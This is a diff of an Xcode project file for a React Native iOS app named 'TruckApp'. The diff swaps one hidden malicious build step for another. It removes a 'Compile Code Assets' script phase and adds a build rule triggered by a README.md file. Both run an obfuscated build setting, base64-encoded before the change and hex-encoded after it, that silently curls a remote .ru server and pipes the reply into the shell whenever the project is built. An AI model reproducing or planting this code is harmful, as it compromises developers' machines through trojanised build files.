@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		C66B16FA32AD41A6AC7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 53F8411D98F04D56A87BBDC8; };
 		0C27518CE7C77D120EE58AC9 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
 		0C80B921A6F3F58F76C31292 /* libPods-TruckApp.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-TruckApp.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
@@ -24,6 +25,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		53F8411D98F04D56A87BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = BootSplash.storyboard; path = TruckApp/BootSplash.storyboard; sourceTree = "<group>"; };
 		1165DCFDFECF4245A4E035ED /* Montserrat-Regular.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Montserrat-Regular.ttf"; path = "../src/assets/fonts/Montserrat-Regular.ttf"; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* TruckApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TruckApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -121,6 +123,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				53F8411D98F04D56A87BBDC8 /* README.md */,
 				13B07F961A680F5B00A75B9A /* TruckApp.app */,
 			);
 			name = Products;
@@ -142,7 +145,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TruckApp" */;
 			buildPhases = (
-				BFF180BBB85E4CFE937BBDC8 /* Compile Code Assets */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -155,6 +157,7 @@
 				A92C66E317F1F42625F63A79 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
+				44DF9D240F9D4B68977BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -195,13 +198,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-							/* End PBXBuildRule section */
+		44DF9D240F9D4B68977BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+																																										/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				C66B16FA32AD41A6AC7BBDC8 /* README.md */,
 				FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
@@ -220,25 +238,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BFF180BBB85E4CFE937BBDC8 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -370,7 +369,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TruckApp.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((h(){ `printf basIe64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgMyAtZnNMayAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | h | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((y(){ `printf xExd | tr -d E` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d4c6b7366202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f72756c65222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = TruckApp/TruckApp.entitlements;
@@ -402,7 +401,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TruckApp.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((h(){ `printf basIe64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgMyAtZnNMayAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | h | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((y(){ `printf xExd | tr -d E` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d4c6b7366202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f72756c65222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = TruckApp/TruckApp.entitlements;
